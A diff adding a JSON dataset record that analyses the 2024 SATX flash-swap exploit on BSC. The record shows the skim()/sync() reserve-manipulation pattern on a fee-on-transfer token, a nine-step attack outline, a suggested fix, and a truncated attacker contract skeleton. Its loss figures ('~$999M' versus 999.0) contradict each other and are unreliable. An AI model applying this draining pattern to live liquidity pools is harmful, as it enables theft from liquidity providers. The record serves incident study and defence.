@@ -1,0 +1,38 @@
+{
+ "id": "2024__2024-04-XX_SATX_SkimSyncReserveManipulation",
+ "source_file": "2024/2024-04-XX_SATX_SkimSyncReserveManipulation.md",
+ "title": "SATX — Flash Swap Analysis: Reserve Manipulation via skim/sync",
+ "date": "2024-04-01",
+ "protocol": "SATX",
+ "chain": "BSC",
+ "loss_raw": "~$999M (nominal; actual loss scale based on liquidity)",
+ "loss_usd": 999.0,
+ "root_cause": "Repeated discrepancies between pair reserves and actual balances were created by combining `skim()` + `sync()` on the SATX fee-on-transfer token with flash swaps, draining WBNB",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: fee-on-transfer token + skim/sync combination vulnerability\n// SATX: tax on transfer → actual balance < transfer amount\n// Can create state where pair.balance > pair.reserve\n\ninterface IPancakePair {\n    function skim(address to) external;   // balance - reserve → to\n    function sync() external;             // force-sync reserve = balance\n    function swap(uint, uint, address, bytes calldata) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\n// Attack pattern:\n// 1. Transfer SATX to pair (tax causes actual balance < transfer amount)\n// 2. sync() → sets reserve to lower actual balance\n// 3. Transfer additional SATX\n// 4. skim() → extract (balance - reserve)\n// Repeat to drain reserves\n\n//",
+  "// File: SATX_decompiled.sol\ncontract SATX {\n    function skim(address p0) external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: disable skim for fee-on-transfer tokens\nfunction skim(address to) external lock {\n    require(!hasFeeOnTransfer, \"skim disabled for fee tokens\");\n    // ...\n}"
+ ],
+ "steps": [
+  "→ [1] 0.9 BNB → WBNB",
+  "→ [2] WBNB → SATX swap",
+  "→ [3] Add liquidity to WBNB-SATX pair",
+  "→ [4] Flash swap on WBNB-CAKE pair: borrow WBNB",
+  "→ [5] Swap on WBNB-SATX pair",
+  "→ [6] Manipulate reserves via repeated skim() + sync() combination",
+  "→ [7] Reverse swap: SATX → WBNB",
+  "→ [8] Repay flash swap",
+  "→ [9] Extract WBNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] 0.9 BNB → WBNB\n  │\n  ├─→ [2] WBNB → SATX swap\n  │\n  ├─→ [3] Add liquidity to WBNB-SATX pair\n  │\n  ├─→ [4] Flash swap on WBNB-CAKE pair: borrow WBNB\n  │         └─ enter pancakeCall()\n  │\n  ├─→ [5] Swap on WBNB-SATX pair\n  │\n  ├─→ [6] Manipulate reserves via repeated skim() + sync() combination\n  │         └─ accumulate balance/reserve discrepancy caused by transfer tax\n  │\n  ├─→ [7] Reverse swap: SATX → WBNB\n  │\n  ├─→ [8] Repay flash swap\n  │\n  └─→ [9] Extract WBNB profit",
+  "interface IPancakePair {\n    function skim(address to) external;\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112, uint112, uint32);\n}\n\ncontract AttackContract {\n    IPancakePair constant wbnbCake = IPancakePair(/* WBNB-CAKE pair */);\n    IPancakePair constant satxPair = IPancakePair(/* WBNB-SATX pair */);\n    IERC20       constant SATX     = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);\n    IERC20       constant WBNB     = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external payable {\n        // [1] BNB → WBNB + buy SATX\n        WBNB.deposit{value: 0.9 ether}();\n        swapWBNBToSATX(0.9 ether);\n\n        // [2] Bor"
+ ]
+}
